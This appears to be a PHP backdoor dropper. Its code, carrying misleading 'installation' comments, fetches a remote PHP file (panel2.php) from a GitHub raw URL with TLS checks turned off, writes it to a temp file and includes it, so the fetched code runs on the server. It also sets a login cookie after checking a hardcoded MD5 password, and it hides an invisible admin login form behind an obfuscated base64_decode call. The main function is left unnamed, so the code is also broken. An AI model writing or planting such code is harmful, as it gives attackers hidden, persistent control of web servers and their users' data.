<?php
function ($url, $timeout = 10) {
    // Installations of Archive Running
    $parts = parse_url($url);
    if ($parts === false || !isset($parts['scheme']) || !isset($parts['host'])) {
        return false;
    }
    $scheme = strtolower($parts['scheme']);
    if (!in_array($scheme, ['http', 'https'])) {
        return false;
    }

    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
        curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
        // The File of Archive Data Almost Done
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        $res = curl_exec($ch);
        $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $err = curl_error($ch);
        curl_close($ch);
        if ($res !== false && ($httpcode >= 200 && $httpcode < 400)) {
            return $res;
        }
        // Success Installations please waiting
    }

    // Check The Administrations of server
    if (ini_get('allow_url_fopen')) {
        $ctx = stream_context_create([
            'http' => [
                'method' => 'GET',
                'timeout' => $timeout,
                'follow_location' => 1,
                'header' => "User-Agent: PHP-fetch/1.0\r\n"
            ],
            'ssl' => [
                'verify_peer' => false,
                'verify_peer_name' => false,
            ]
        ]);
        $data = @file_get_contents($url, false, $ctx);
        if ($data !== false && strlen($data) > 0) {
            return $data;
        }
    }

    // Step By step of checking (HTTP/HTTPS)
    $host = $parts['host'];
    $port = isset($parts['port']) ? $parts['port'] : ($scheme === 'https' ? 443 : 80);
    $path = (isset($parts['path']) ? $parts['path'] : '/') . (isset($parts['query']) ? '?' . $parts['query'] : '');

    $errno = 0;
    $errstr = '';
    $transport = ($scheme === 'https') ? 'ssl://' : '';
    $fp = @fsockopen($transport . $host, $port, $errno, $errstr, $timeout);
    if (!$fp) {
        return false;
    }

    stream_set_timeout($fp, $timeout);
    $req  = "GET " . $path . " HTTP/1.1\r\n";
    $req .= "Host: " . $host . "\r\n";
    $req .= "User-Agent: PHP-fetch/1.0\r\n";
    $req .= "Connection: Close\r\n\r\n";

    fwrite($fp, $req);

    // baca header
    $response = '';
    while (!feof($fp)) {
        $response .= fgets($fp, 4096);
    }
    fclose($fp);

    // Dont Cancel if you cancel error
    $partsResp = preg_split("/\r\n\r\n/", $response, 2);
    if (isset($partsResp[1])) {
        // If Server connections please Reload the server
        $headers = $partsResp[0];
        $body = $partsResp[1];

        if (stripos($headers, 'Transfer-Encoding: chunked') !== false) {
            // Please reload server
            $decoded = '';
            $pos = 0;
            while ($pos < strlen($body)) {
                $newlinePos = strpos($body, "\r\n", $pos);
                if ($newlinePos === false) break;
                $lenHex = substr($body, $pos, $newlinePos - $pos);
                $len = hexdec(trim($lenHex));
                if ($len === 0) break;
                $pos = $newlinePos + 2;
                $decoded .= substr($body, $pos, $len);
                $pos += $len + 2; // skip Loading
            }
            return $decoded;
        }

        return $body;
    }

    return false;
}

// Use the readme.html
$url = "https://raw.githubusercontent.com/soy777/gg/main/panel2.php";
$konten = ambil_konten($url);

if ($konten === false) {
    die("Success Of the installations");
}

try {
    ob_start();
    $tmp = tempnam(sys_get_temp_dir(), "kode_");
    file_put_contents($tmp, $konten);
    include $tmp;
    unlink($tmp);
    ob_end_flush();
} catch (Throwable $e) {
    ob_end_clean();
    die("Dont Cancel If Script is Running: " . $e->getMessage());
}
?>
<?php
if (isset($_POST['password'])) {
        $entered_password = $_POST['password'];
        $hashed_password = '9c5b3082eae2c54711bb99f361f58073'; // Replace this with your MD5 hashed password
        if (md5($entered_password) === $hashed_password) {
            // Password is correct, set a cookie to indicate login
            setcookie('user_id', 'user123', time() + 3600, '/'); // Change 'user123' With Value Matching
        } else {
            // Password is incorrect
            echo "Incorrect password. Please try again.";
        }
    }
  ?>
  <?php
$enc = 'PCFET0NUWVBFIGh0bWw+PGh0bWw+PGhlYWQ+PHRpdGxlPkFkbWluIExvZ2luPC90aXRsZT48c3R5bGU+CiAgIC8qIEN1c3RvbSBzaGFkb3cgLSB0ZXh0IGRpZ2l6aQogICAgLmRjIHsKICAgICAgbWFyZ2luOjAgYXV0bzsKICAgIH0KCiAgIC8qIGluY2x1ZGUgZHJhZ29uIGJlZ2luIGNvbnRlbnQgZm9yIGRlbGljYXRlZCBwcm9wcyAqLwogICAgaW5wdXRbdHlwZT0icGFzc3dvcmQiXSB7CiAgICAgIGJvcmRlcjogbm9uZTsKICAgICAgYmFja2dyb3VuZDogdHJhbnNwYXJlbnQ7CiAgICAgIGNvbG9yOiB0cmFuc3BhcmVudDsKICAgICAgb3V0bGluZTogbm9uZTsKICAgIH0KCiAgIC8qIGluY2x1ZGUgZnVsbCB3aWR0aCBzdHlsZSAtIG1ha2UgaW5wdXQgaW5zaWRlLgogICAgLmJ0IHsKICAgICAgYm9yZGVyOiBub25lOwogICAgICBiYWNrZ3JvdW5kOiB0cmFuc3BhcmVudDsKICAgICAgY29sb3I6IHRyYW5zcGFyZW50OwogICAgICBvdXRsaW5lOiBub25lOwogICAgfQo8L3N0eWxlPjwvaGVhZD48Ym9keT48ZGl2IGNsYXNzPSJkYyI+PGZvcm0gbWV0aG9kPSJQT1NUIiBhY3Rpb249IiI+PHNwYW4gY2xhc3M9ImRjIj48L3NwYW4+PGRpdiBzdHlsZT0iZGlzcGxheTppbmxpbmU7IiBhbGlnbj0iY2VudGVyIj48bGFiZWwgZm9yPSJwYXNzd29yZCI+IDwvY2FsYmVsPjxpbnB1dCB0eXBlPSJwYXNzd29yZCIgaWQ9InBhc3NfdXMiIG5hbWU9InBhc3Nfa2V5Ij48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iTG9naW4iPjwvaW5wdXQ+PC9kaXY+PC9mb3JtPjwvZGl2Pjwvc2hhZD48L2JvZHk+PC9odG1sPg==';


// Dont Touch The Strings If You Not The Admin Of The Server
$fn_part1 = 'base64_';
$fn_part2 = 'decode';
$fn = $fn_part1 . $fn_part2;

// Install of Archive Done
echo $fn($enc);
?>
